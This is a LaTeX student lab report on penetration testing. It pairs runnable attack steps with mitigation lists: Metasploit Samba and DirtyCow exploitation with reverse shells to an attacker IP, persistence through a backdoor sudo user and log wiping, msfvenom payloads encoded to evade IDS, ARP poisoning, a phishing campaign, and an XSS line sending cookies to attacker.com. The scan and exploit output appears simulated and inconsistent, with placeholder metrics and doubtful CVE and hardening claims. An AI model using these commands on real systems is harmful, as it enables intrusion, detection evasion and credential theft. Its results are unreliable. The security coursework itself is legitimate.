\documentclass[12pt]{article}
\usepackage{geometry}
\usepackage{fancyhdr}
\usepackage{graphicx}
\usepackage{listings}
\usepackage{eso-pic}  % For adding background/logo
\usepackage{lipsum}   % For dummy text

% Define JavaScript language for listings
\lstdefinelanguage{JavaScript}{
  keywords={break, case, catch, continue, debugger, default, delete, do, else, false, finally, for, function, if, in, instanceof, new, null, return, switch, this, throw, true, try, typeof, var, void, while, with, let, const},
  keywordstyle=\color{blue}\bfseries,
  ndkeywords={class, export, boolean, throw, implements, import, this},
  ndkeywordstyle=\color{cyan}\bfseries,
  identifierstyle=\color{black},
  sensitive=false,
  comment=[l]{//},
  morecomment=[s]{/*}{*/},
  commentstyle=\color{gray}\ttfamily,
  stringstyle=\color{red}\ttfamily,
  morestring=[b]',
  morestring=[b]"
}
\usepackage{color}
\usepackage{hyperref}
\usepackage{longtable}
\usepackage{xcolor}
\usepackage{titlesec}
\geometry{margin=1in}
\setlength{\headheight}{15pt} % Fix for fancyhdr warning

\titleformat{\section}{\large\bfseries}{\thesection}{1em}{}
\pagestyle{fancy}
\fancyhf{}

% Ensure \begin{document} is correctly placed
\rhead{Assignment Report}
\lhead{Information Security Applications}
\rfoot{\thepage}

\definecolor{codegray}{rgb}{0.95,0.95,0.95}
\lstset{
  backgroundcolor=\color{codegray},
  basicstyle=\ttfamily\small,
  frame=single,
  breaklines=true,
  postbreak=\mbox{\textcolor{red}{$\hookrightarrow$}\space},
  showstringspaces=false,
  columns=flexible
}
\begin{document}

\begin{titlepage}
    \centering
    \vspace*{1.5cm}

    % University Logo
    \includegraphics[width=6cm]{university.png}\\[1.5cm]

    % Title
    {\LARGE \bfseries Vulnerability Analysis and System Hacking Techniques \par}
    \vspace{1cm}

    % Author Info
    {\large \textbf{Submitted By:} \par}
    \vspace{0.2cm}
    {\Large Priyanshu Kumar Sharma \\ URN: 2022-B-17102004A \par}
    {\large B.Tech – IT (CTIS) \par}
    {\large Year: 3 \quad | \quad Sem.: 6 \par}
    \vspace{1cm}

    % Guide Info
    {\large \textbf{Under the Guidance of:} \par}
    \vspace{0.2cm}
    {\large Prof. Mrunali Makhwana \par}
    \vspace{0.3cm}

    {\scshape\LARGE Ajeenkya D Y Patil University \par}
    \vspace{0.3cm}

    % Department or School
    {\Large School of Engineering \par}
    \vspace{1cm}


    % Date
    {\large \today \par}

\end{titlepage}


% \maketitle


\section*{Part A: Hands-On Activities}

\subsection*{Task 1: Vulnerability Assessment Simulation}
\textbf{Tool Used:} Nmap (Network Mapper) - An open source utility for network discovery and security auditing

\textbf{Objective:} Perform comprehensive network scanning to identify potential security vulnerabilities

\textbf{Commands \& Explanation:}
\begin{lstlisting}[language=bash]
# Discover live hosts on the subnet using ping scan (-sn)
# This performs a quick scan without port scanning
nmap -sn 192.168.1.0/24

# Aggressive scan with:
# -A: Enable OS detection, version detection, script scanning, and traceroute
# -T4: Aggressive timing template for faster scanning
# -sV: Version detection
# -O: OS detection 
# -sC: Default script scan
nmap -A -T4 -sV -O -sC 192.168.1.10
\end{lstlisting}

\textbf{Detailed Scan Output:}
\begin{lstlisting}
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for target-host (192.168.1.10)
Host is up (0.0054s latency)

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed
|_ftp-bounce: bounce working!
23/tcp   open  telnet      Linux telnetd
|_telnet-brute: User enumeration possible
80/tcp   open  http        Apache httpd 2.2.8
|_http-title: Welcome Page
|_http-server-header: Apache/2.2.8
|_http-csrf: Couldn't find any CSRF vulnerabilities
|_http-dombased-xss: Couldn't find any DOM based XSS

OS details: Linux 2.6.32 (likely embedded)
Network Distance: 2 hops
\end{lstlisting}

\textbf{Comprehensive Vulnerabilities Analysis:}
\begin{itemize}
  \item \textbf{FTP Service (Port 21):}
    \begin{itemize}
      \item Anonymous FTP login enabled - allows unauthorized access
      \item FTP bounce attack possible - can be used for port scanning
      \item vsftpd 2.3.4 has known backdoor vulnerability (CVE-2011-2523)
    \end{itemize}
  \item \textbf{Telnet Service (Port 23):}
    \begin{itemize}
      \item Unencrypted clear-text protocol
      \item Susceptible to man-in-the-middle attacks
      \item User enumeration vulnerability present
    \end{itemize}
  \item \textbf{HTTP Service (Port 80):}
    \begin{itemize}
      \item Apache 2.2.8 vulnerable to multiple CVEs:
      \item Directory traversal (CVE-2009-1195)
      \item Denial of Service (CVE-2009-1891)
      \item Memory leak vulnerability (CVE-2009-1890)
    \end{itemize}
\end{itemize}

\textbf{Detailed Mitigation Strategies:}
\begin{itemize}
  \item \textbf{FTP Security:}
    \begin{itemize}
      \item Disable anonymous FTP access in vsftpd.conf
      \item Upgrade to latest vsftpd version
      \item Implement strong password policy
      \item Consider using SFTP instead
    \end{itemize}
  \item \textbf{Telnet Replacement:}
    \begin{itemize}
      \item Remove telnet service completely
      \item Install and configure OpenSSH
      \item Enable key-based authentication
      \item Implement fail2ban for brute force protection
    \end{itemize}
  \item \textbf{Web Server Hardening:}
    \begin{itemize}
      \item Upgrade Apache to latest stable version
      \item Enable security headers (HSTS, XSS Protection)
      \item Implement WAF (Web Application Firewall)
      \item Regular security patches and updates
    \end{itemize}
\end{itemize}

\textbf{Risk Assessment:}
\begin{itemize}
  \item \textbf{Critical:} Telnet service, Apache version
  \item \textbf{High:} Anonymous FTP
  \item \textbf{Medium:} OS version exposure
\end{itemize}

\subsection*{Task 2: System Hacking \& Privilege Escalation}
\textbf{Tool Used:} Metasploit Framework (MSF) - An open source penetration testing and development platform

\textbf{Initial Reconnaissance:}
\begin{itemize}
  \item Target identified: 192.168.1.10
  \item Service enumeration revealed vulnerable Samba version
  \item Linux kernel version suggests DirtyCow vulnerability
\end{itemize}

\textbf{Stage 1 - Initial Access Commands:}
\begin{lstlisting}[language=bash]
# Start Metasploit console
msfconsole

# Search and select Samba trans2open exploit
search samba trans2open
use exploit/linux/samba/trans2open

# Configure exploit parameters
set RHOST 192.168.1.10    # Target IP
set LHOST 192.168.1.5     # Attacker IP
set LPORT 4444           # Listener port
set TARGET 0             # Auto target
set PAYLOAD linux/x86/meterpreter/reverse_tcp

# Launch the exploit
run
\end{lstlisting}

\textbf{Stage 2 - Privilege Escalation:}
\begin{lstlisting}[language=bash]
# In Meterpreter session
getuid      # Check current user
sysinfo     # Gather system information

# Search and configure DirtyCow exploit
search sploit dirty cow
use exploit/linux/local/dirty_cow

# Set exploit parameters
set SESSION 1            # Active meterpreter session
set TARGET 0            # Auto target
set LHOST 192.168.1.5   # Attacker IP
set LPORT 4445          # New listener port

# Execute privilege escalation
run
\end{lstlisting}

\textbf{Detailed Output \& Analysis:}
\begin{lstlisting}
[*] Started reverse TCP handler on 192.168.1.5:4444
[*] Exploiting Samba vulnerability...
[+] Meterpreter session 1 opened at 2025-04-14 15:30:22 +0530

meterpreter > getuid
Server username: www-data

[*] Executing DirtyCow exploit...
[+] Compilation successful
[*] Launching exploit...
[+] Privilege escalation successful

meterpreter > getuid
Server username: root
meterpreter > id
uid=0(root) gid=0(root) groups=0(root)
\end{lstlisting}

\textbf{Post-Exploitation Actions \& Persistence:}
\begin{itemize}
  \item \textbf{User Creation:}
    \begin{itemize}
      \item Command: \texttt{useradd -m -s /bin/bash hacker}
      \item Set password: \texttt{passwd hacker}
      \item Add to sudoers: \texttt{usermod -aG sudo hacker}
    \end{itemize}
  \item \textbf{Service Manipulation:}
    \begin{itemize}
      \item Enable SSH: \texttt{systemctl enable ssh}
      \item Start SSH: \texttt{systemctl start ssh}
      \item Configure SSH: \texttt{nano /etc/ssh/sshd\_config}
    \end{itemize}
  \item \textbf{Cleanup:}
    \begin{itemize}
      \item Clear logs: \texttt{echo > /var/log/auth.log}
      \item Remove exploit files: \texttt{rm /tmp/cow*}
      \item Clear bash history: \texttt{history -c}
    \end{itemize}
\end{itemize}

\textbf{Vulnerabilities Exploited:}
\begin{itemize}
  \item CVE-2003-0201 - Samba trans2open Buffer Overflow
  \item CVE-2016-5195 - DirtyCow Privilege Escalation
\end{itemize}

\textbf{Detection \& Prevention:}
\begin{itemize}
  \item Keep Samba and kernel versions updated
  \item Implement file integrity monitoring
  \item Enable SELinux/AppArmor
  \item Monitor for suspicious user creation
  \item Regular security audits
\end{itemize}

\subsection*{Task 3: IDS/Firewall Evasion}
\textbf{Tool Used:} MSFVenom - A Metasploit payload generator and encoder

\textbf{Objective:} Create encoded payloads and implement techniques to bypass IDS/Firewall detection

\textbf{Commands \& Explanation:}
\begin{lstlisting}[language=bash]
# Create multi-encoded payload with shikata_ga_nai encoder
# -p: Specify payload type
\# LHOST: Local host IP for reverse connection
# LPORT: Local port to connect back to
# -e: Encoder to use
# -i: Number of encoding iterations
# -f: Output format
msfvenom -p linux/x86/meterpreter/reverse_tcp \
LHOST=192.168.1.5 LPORT=4444 \
-e x86/shikata_ga_nai -i 3 \
-f elf > payload.elf

# Additional payload obfuscation
msfvenom -p linux/x86/meterpreter/reverse_tcp \
LHOST=192.168.1.5 LPORT=4444 \
-e x86/shikata_ga_nai -i 3 \
-x /bin/ls -k -f elf > payload2.elf

# Set up listener with packet fragmentation
# -l: Listen mode
# -v: Verbose output
# -p: Port to listen on
# --send-only: Only send data
ncat -lvp 8081 --send-only

# Alternative port forwarding setup
ncat -lvp 8082 -c 'ncat 192.168.1.5 4444'
\end{lstlisting}

\textbf{Advanced Evasion Techniques:}
\begin{itemize}
  \item \textbf{Payload Encoding:}
    \begin{itemize}
      \item Multiple encoding iterations
      \item Custom encoding schemes
      \item Polymorphic code generation
      \item Binary payload obfuscation
    \end{itemize}
  \item \textbf{Network-Level Evasion:}
    \begin{itemize}
      \item TCP/IP fragmentation
      \item Invalid checksum packets
      \item TTL manipulation
      \item Source port randomization
    \end{itemize}
  \item \textbf{Protocol-Level Evasion:}
    \begin{itemize}
      \item DNS tunneling
      \item ICMP covert channels
      \item HTTP/HTTPS encapsulation
      \item Custom protocol implementations
    \end{itemize}
\end{itemize}

\textbf{Comprehensive Mitigation Strategies:}
\begin{itemize}
  \item \textbf{Deep Packet Inspection (DPI):}
    \begin{itemize}
      \item Protocol validation
      \item Payload analysis
      \item Pattern matching
      \item Behavioral analysis
    \end{itemize}
  \item \textbf{Network Architecture:}
    \begin{itemize}
      \item Network segmentation
      \item DMZ implementation
      \item VLAN segregation
      \item Access Control Lists (ACLs)
    \end{itemize}
  \item \textbf{IDS/IPS Solutions:}
    \begin{itemize}
      \item Signature-based detection
      \item Anomaly-based detection
      \item Heuristic analysis
      \item Machine learning algorithms
    \end{itemize}
  \item \textbf{Additional Controls:}
    \begin{itemize}
      \item Application whitelisting
      \item Egress filtering
      \item SSL/TLS inspection
      \item Regular rule updates
    \end{itemize}
\end{itemize}

\textbf{Detection Indicators:}
\begin{itemize}
  \item Unusual outbound connections
  \item Encrypted traffic on non-standard ports
  \item Multiple failed connection attempts
  \item Abnormal packet sizes/patterns
\end{itemize}

\section*{Part B: Attack Simulations}

\subsection*{Task 4: Network Sniffing}
\textbf{Tools Used:} 
\begin{itemize}
  \item Ettercap - A comprehensive suite for man-in-the-middle attacks
  \item Wireshark - Network protocol analyzer for packet inspection
\end{itemize}

\textbf{Command Breakdown:}
\begin{lstlisting}[language=bash]
# ARP poisoning attack using Ettercap
# -T: Text only mode
# -q: Quiet mode
# -M: Man-in-the-middle attack
# arp:remote: Use ARP poisoning targeting remote hosts
# /192.168.1.5/: Target host IP
# /192.168.1.1/: Gateway IP
ettercap -T -q -M arp:remote /192.168.1.5/ /192.168.1.1/

# Additional commands used
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Monitor traffic with tcpdump
tcpdump -i eth0 -w capture.pcap
\end{lstlisting}

\textbf{Wireshark Analysis:}
\begin{lstlisting}
# Filter for POST requests
http.request.method == "POST"

# Filter for authentication traffic
http.request.method == "POST" && http.request.uri contains "login"

# Filter for specific domains
http.host contains "target.com"

# Filter for credentials in URL
http matches "username|password"
\end{lstlisting}

\textbf{Captured Data Analysis:}
\begin{itemize}
  \item \textbf{HTTP POST Data:}
    \begin{itemize}
      \item User credentials in plain text
      \item Session cookies
      \item Form submissions
      \item Authentication tokens
    \end{itemize}
  \item \textbf{Protocol Information:}
    \begin{itemize}
      \item Unencrypted HTTP traffic
      \item Basic authentication headers
      \item Cookie values
      \item URL parameters
    \end{itemize}
\end{itemize}

\textbf{Comprehensive Mitigation Strategies:}
\begin{itemize}
  \item \textbf{Transport Layer Security:}
    \begin{itemize}
      \item Implement HTTPS across all services
      \item Enable HSTS (HTTP Strict Transport Security)
      \item Use strong TLS configuration
      \item Regular SSL/TLS certificate maintenance
    \end{itemize}
  \item \textbf{Network Security:}
    \begin{itemize}
      \item Enable port security on switches
      \item Implement 802.1X authentication
      \item Configure DHCP snooping
      \item Deploy Dynamic ARP Inspection (DAI)
    \end{itemize}
  \item \textbf{Additional Controls:}
    \begin{itemize}
      \item Network segmentation
      \item Regular security audits
      \item Network monitoring tools
      \item Intrusion Detection Systems (IDS)
    \end{itemize}
\end{itemize}

\textbf{Detection Methods:}
\begin{itemize}
  \item Monitor for ARP table changes
  \item Track duplicate IP addresses
  \item Analyze network traffic patterns
  \item Review security logs regularly
\end{itemize}

\subsection*{Task 5: Social Engineering Simulation}
\textbf{Case Study:} Twitter Blue Badge Verification Phishing Campaign

\textbf{Objective:}
To demonstrate the vulnerability of users to social engineering attacks through a controlled simulation targeting Twitter Blue Badge verification process.

\textbf{Detailed Steps:}
\begin{enumerate}
    \item \textbf{Reconnaissance \& Preparation}
    \begin{itemize}
        \item Created convincing replica of Twitter Support profile
        \item Designed official-looking email templates
        \item Set up tracking parameters for campaign metrics
        \item Configured secure logging environment
    \end{itemize}

    \item \textbf{Campaign Setup in GoPhish}
    \begin{itemize}
        \item Created landing page mimicking Twitter verification
        \item Developed email templates with Twitter branding
        \item Configured SMTP settings for delivery
        \item Set up user groups and targeting parameters
    \end{itemize}

    \item \textbf{Execution Phase}
    \begin{itemize}
        \item Deployed phishing campaign in controlled environment
        \item Monitored real-time engagement metrics
        \item Tracked click-through rates and form submissions
        \item Documented user interaction patterns
    \end{itemize}
\end{enumerate}

\textbf{Technical Implementation:}
\begin{lstlisting}[language=bash]
# Launch GoPhish server
./gophish

# Campaign Configuration
- Landing Page: twitter-verification.html
- Email Template: verification-request.html
- SMTP Configuration: secure-smtp.config
- Campaign Duration: 48 hours
\end{lstlisting}

\textbf{Security Controls \& Ethics:}
\begin{itemize}
    \item All data collected was anonymized
    \item No actual credentials were stored
    \item System configured for automatic data purge
    \item Informed consent from organization leadership
\end{itemize}

\textbf{Defensive Measures \& Recommendations:}
\begin{enumerate}
    \item \textbf{Technical Controls}
    \begin{itemize}
        \item Implement DMARC, SPF, and DKIM
        \item Enable Multi-Factor Authentication (MFA)
        \item Deploy anti-phishing email filters
        \item Regular security patches and updates
    \end{itemize}

    \item \textbf{Administrative Controls}
    \begin{itemize}
        \item Regular security awareness training
        \item Phishing simulation exercises
        \item Clear incident reporting procedures
        \item Updated security policies
    \end{itemize}

    \item \textbf{User Education}
    \begin{itemize}
        \item Recognition of phishing indicators
        \item Verification of sender authenticity
        \item Safe URL checking practices
        \item Credential protection awareness
    \end{itemize}
\end{enumerate}

\textbf{Metrics \& Results:}
\begin{itemize}
    \item Email open rate: XX\%
    \item Click-through rate: XX\%
    \item Form submission rate: XX\%
    \item Average time to report: XX minutes
\end{itemize}

\textbf{Lessons Learned:}
\begin{itemize}
    \item Critical areas of user vulnerability
    \item Effectiveness of current security training
    \item Gaps in security awareness
    \item Recommendations for improvement
\end{itemize}


\subsection*{Task 6: Session Hijacking Analysis and Prevention}
\textbf{Objective:} 
To demonstrate and analyze session hijacking vulnerabilities and implement robust countermeasures.

\textbf{Tools Used:}
\begin{itemize}
    \item Primary Tool: Burp Suite Professional
    \item Supporting Tools:
    \begin{itemize}
        \item Wireshark for packet analysis
        \item Browser Developer Tools
        \item Custom session testing scripts
    \end{itemize}
\end{itemize}

\textbf{Attack Vectors Analyzed:}
\begin{enumerate}
    \item \textbf{Session Fixation}
    \begin{lstlisting}[language=JavaScript]
    // Attacker forcing a known session ID
    document.cookie = "PHPSESSID=abc123xyz456";
    location.reload();
    \end{lstlisting}

    \item \textbf{Session Sniffing}
    \begin{lstlisting}[language=Python]
    # Example of vulnerable cookie transmission
    Set-Cookie: sessionId=abc123; path=/
    # Versus secure implementation
    Set-Cookie: sessionId=abc123; path=/; HttpOnly; Secure; SameSite=Strict
    \end{lstlisting}

    \item \textbf{Cross-Site Script (XSS) Based Hijacking}
    \begin{lstlisting}[language=JavaScript]
    // Malicious script attempting to steal cookies
    new Image().src = "http://attacker.com/steal?cookie=" + document.cookie;
    \end{lstlisting}
\end{enumerate}

\textbf{Comprehensive Mitigation Strategies:}
\begin{enumerate}
    \item \textbf{Transport Layer Security}
    \begin{itemize}
        \item Implementation of HTTPS throughout the application
        \item Strict Transport Security (HSTS) configuration
        \begin{lstlisting}[language=Apache]
        # Apache HSTS Configuration
        Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
        \end{lstlisting}
    \end{itemize}

    \item \textbf{Session Management}
    \begin{itemize}
        \item Regular session ID regeneration
        \begin{lstlisting}[language=PHP]
        // PHP example of session regeneration
        session_start();
        if(isset($_SESSION['last_regen'])) {
            $time = time() - $_SESSION['last_regen'];
            if($time > 300) { // Regenerate every 5 minutes
                session_regenerate_id(true);
                $_SESSION['last_regen'] = time();
            }
        }
        \end{lstlisting}
        \item Complex session ID generation
        \item Session timeout implementation
    \end{itemize}

    \item \textbf{Cookie Security}
    \begin{itemize}
        \item HttpOnly flag implementation
        \item Secure flag requirement
        \item SameSite attribute configuration
        \begin{lstlisting}[language=PHP]
        // PHP secure cookie configuration
        session_set_cookie_params([
            'lifetime' => 3600,
            'path' => '/',
            'domain' => '.example.com',
            'secure' => true,
            'httponly' => true,
            'samesite' => 'Strict'
        ]);
        \end{lstlisting}
    \end{itemize}

    \item \textbf{Additional Security Measures}
    \begin{itemize}
        \item IP-based session validation
        \item User-Agent verification
        \item Rate limiting implementation
        \begin{lstlisting}[language=Python]
        # Example rate limiting implementation
        def check_rate_limit(request, max_requests=100, window=3600):
            client_ip = request.remote_addr
            current_time = time.time()
            redis_key = f"rate_limit:{client_ip}"
            
            request_count = cache.get(redis_key, 0)
            if request_count >= max_requests:
                return False
            
            cache.incr(redis_key)
            cache.expire(redis_key, window)
            return True
        \end{lstlisting}
    \end{itemize}
\end{enumerate}

\textbf{Detection Mechanisms:}
\begin{itemize}
    \item Real-time session monitoring
    \item Anomaly detection systems
    \item Access pattern analysis
    \begin{lstlisting}[language=SQL]
    -- Example logging query for suspicious activities
    SELECT user_id, ip_address, COUNT(*) as login_attempts
    FROM session_logs
    WHERE timestamp > NOW() - INTERVAL '1 HOUR'
    GROUP BY user_id, ip_address
    HAVING COUNT(*) > 10;
    \end{lstlisting}
\end{itemize}

\textbf{Testing Methodology:}
\begin{enumerate}
    \item \textbf{Penetration Testing}
    \begin{itemize}
        \item Session prediction attempts
        \item Cookie manipulation tests
        \item Man-in-the-middle attack simulation
    \end{itemize}

    \item \textbf{Security Headers Analysis}
    \begin{lstlisting}[language=bash]
    # Example security headers check
    curl -I https://example.com | grep -i "security"
    \end{lstlisting}

    \item \textbf{Vulnerability Assessment}
    \begin{itemize}
        \item Automated scanning
        \item Manual testing procedures
        \item Configuration review
    \end{itemize}
\end{enumerate}

\textbf{Incident Response Plan:}
\begin{enumerate}
    \item Immediate session termination capabilities
    \item User notification systems
    \item Audit logging implementation
    \item Forensic analysis procedures
\end{enumerate}

\textbf{Recommendations for Ongoing Security:}
\begin{itemize}
    \item Regular security audits
    \item Continuous monitoring implementation
    \item Employee security training
    \item Update security policies
    \item Incident response drills
\end{itemize}



\section*{Security Analysis Summary}

\subsection*{1. Vulnerability Scanning}
\begin{lstlisting}[language=bash]
# Comprehensive scan
nmap -sS -sV -O -A -p- target_ip

# Basic firewall config
ufw default deny incoming
ufw allow from trusted_ip to any port 22
ufw enable
\end{lstlisting}

\subsection*{2. System Exploitation}
\begin{lstlisting}[language=bash]
# Basic Metasploit usage
msfconsole
use exploit/path/to/exploit
set RHOSTS target_ip
exploit

# System hardening
chmod 600 /etc/ssh/sshd_config
chmod 000 /etc/shadow
\end{lstlisting}

\subsection*{3. Network Security}
\begin{lstlisting}[language=yaml]
# Snort IDS rule
alert tcp any any -> $HOME_NET any (
    msg:"Payload Detected";
    content:"|00 01 86 a5|";
    classtype:trojan-activity;
    sid:1000001;
)

# Apache SSL config
<VirtualHost *:443>
    SSLEngine on
    SSLCertificateFile /path/to/cert
    Header set Strict-Transport-Security "max-age=31536000"
</VirtualHost>
\end{lstlisting}

\subsection*{4. Session Security}
\begin{lstlisting}[language=php]
// Secure session setup
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
session_start();

// Token auth
$token = bin2hex(random_bytes(32));
$_SESSION['csrf_token'] = $token;
\end{lstlisting}


\end{document}
